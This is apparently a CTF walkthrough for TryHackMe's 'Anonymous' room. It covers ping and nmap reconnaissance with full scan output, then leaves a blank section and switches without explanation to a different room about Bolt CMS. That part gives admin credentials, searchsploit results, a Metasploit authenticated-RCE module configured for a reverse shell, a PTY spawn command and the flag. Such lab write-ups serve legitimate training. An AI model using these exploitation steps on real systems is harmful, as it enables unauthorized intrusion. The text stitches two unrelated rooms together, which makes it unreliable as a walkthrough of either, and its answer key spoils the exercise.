# Anonymous

<div align="left">

<figure><img src=".gitbook/assets/Anonymous_emblem.svg.png" alt="" width="188"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Anonymous](https://tryhackme.com/room/anonymous)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.152.217`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.152.217 anonymous.thm" >> /etc/hosts

mkdir thm/anonymous.thm  
cd thm/anonymous.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 anonymous.thm 
PING anonymous.thm (10.10.152.217) 56(84) bytes of data.
64 bytes from anonymous.thm (10.10.152.217): icmp_seq=1 ttl=63 time=61.7 ms
64 bytes from anonymous.thm (10.10.152.217): icmp_seq=2 ttl=63 time=62.8 ms
64 bytes from anonymous.thm (10.10.152.217): icmp_seq=3 ttl=63 time=62.0 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

### 2.1 - Enumerate the machine.  How many ports are open?

```bash
nmap --open -p0- -n -Pn -vvv -T4 anonymous.thm
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-12 14:17 EDT
Initiating SYN Stealth Scan at 14:17
Scanning anonymous.thm (10.10.152.217) [65536 ports]
Discovered open port 445/tcp on 10.10.152.217
Discovered open port 21/tcp on 10.10.152.217
Discovered open port 139/tcp on 10.10.152.217
Discovered open port 22/tcp on 10.10.152.217
Completed SYN Stealth Scan at 14:17, 21.16s elapsed (65536 total ports)
Nmap scan report for anonymous.thm (10.10.152.217)
Host is up, received user-set (0.068s latency).
Scanned at 2023-07-12 14:17:22 EDT for 21s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 4 open ports on the machine: 21, 22, 139, 445.

{% hint style="info" %}
4
{% endhint %}

### 2.2 - What service is running on port 21?

```bash
nmap -p21,22,139,445 -sCV -n -Pn -vvv -T4 anonymous.thm
```

```bash
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.80.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  Eetbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-07-12T18:19:14+00:00
| smb2-time: 
|   date: 2023-07-12T18:19:14
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62414/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 16939/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25266/udp): CLEAN (Failed to receive data)
|   Check 4 (port 29472/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

```bash
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.80.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
```

{% hint style="info" %}
FTP
{% endhint %}

### 2.3 - What service is running on ports 139 and 445? 

<pre class="language-bash"><code class="lang-bash">PORT    STATE SERVICE     REASON         VERSION
<strong>139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</strong>445/tcp open  Eetbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
</code></pre>

{% hint style="info" %}
SMB
{% endhint %}

### 2.4 - There's a share on the user's computer.  What's it called? 

\


###

### &#x20;

\










\












#### 3.2 - What port number has a web server with a CMS running?

<figure><img src=".gitbook/assets/Schermata del 2023-06-30 22-42-14.png" alt=""><figcaption><p><a href="http://bolt.thm:8000/">http://bolt.thm:8000/</a></p></figcaption></figure>

{% hint style="info" %}
8000
{% endhint %}

#### 3.3 - What is the username we can find in the CMS?

{% hint style="info" %}
Bolt
{% endhint %}

#### 3.4 - What is the password we can find for the username? 

<figure><img src=".gitbook/assets/Schermata del 2023-06-30 23-21-11.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
boltadmin123
{% endhint %}

#### 3.5 - What version of the CMS is installed on the server? (Ex: Name 1.1.1)

Googling info about Bolt cms we found that panel is usually at location:&#x20;

IP/bolt/login, than we go to: [http://bolt.thm:8000/bolt/login](http://bolt.thm:8000/bolt/login)&#x20;

<figure><img src=".gitbook/assets/Schermata del 2023-06-30 23-23-18.png" alt=""><figcaption></figcaption></figure>

and we log in with our credentials: bolt::boltadmin123

#### 3.6 - There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?

We can use searchsploit to find most famous exploit for bolt cms:

```bash
searchsploit bolt                   
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer Overflow                        | multiple/dos/41869.html
Bolt CMS 3.6.10 - Cross-Site Request Forgery                                                    | php/webapps/47501.txt
Bolt CMS 3.6.4 - Cross-Site Scripting                                                           | php/webapps/46495.txt
Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution                             | php/webapps/46664.html
Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                            | php/webapps/48296.py
Bolt CMS < 3.6.2 - Cross-Site Scripting                                                         | php/webapps/46014.txt
Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow                                         | multiple/remote/24982.txt
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                     | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                            | php/webapps/48411.txt
Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities                                     | php/webapps/21132.txt
CMS Bolt - Arbitrary File Upload (Metasploit)                                                   | php/remote/38196.rb
------------------------------------------------------------------------------------------------ ---------------------------------
```

Bolt CMS 3.7.0 - Authenticated Remote Code Execution                                            | php/webapps/48296.py\
\
EDB-ID is:

{% hint style="info" %}
48296
{% endhint %}

#### 3.7 - Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)

Now we launch msfconsole to find exploit path:

```

msf6 exploit(unix/webapp/bolt_authenticated_rce) > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great      Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
```

{% hint style="info" %}
```
exploit/unix/webapp/bolt_authenticated_rce
```
{% endhint %}

#### 3.8 - Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit

* RHOST is the ip of the machine
* LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
* USERNAME and PASSWORD is that we found in previous enumeration
* TARGETURI is where you want to put our website url. here its bolt website in port 8000

<pre class="language-bash"><code class="lang-bash"><strong>set RHOST bolt.thm
</strong><strong>set LHOST tun0
</strong>set USERNAME bolt
set PASSWORD boltadmin123
exploit
</code></pre>

<figure><img src=".gitbook/assets/Schermata del 2023-07-02 11-20-50.png" alt=""><figcaption><p>root shell</p></figcaption></figure>

#### 3.9 - Look for flag.txt inside the machine.

flag is usually in the path: /home

```bash
cd /home
ls
bolt
composer-setup.php
flag.txt
cat flag.txt
```

or we can spawn a bash shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
find / -type f -name 'flag.txt' 2>/dev/null
cat /root/flag.txt
```

<details>

<summary>🚩 Flag 1 (flag.txt)</summary>

THM{wh0\_d035nt\_l0ve5\_b0l7\_r1gh7?}

</details>
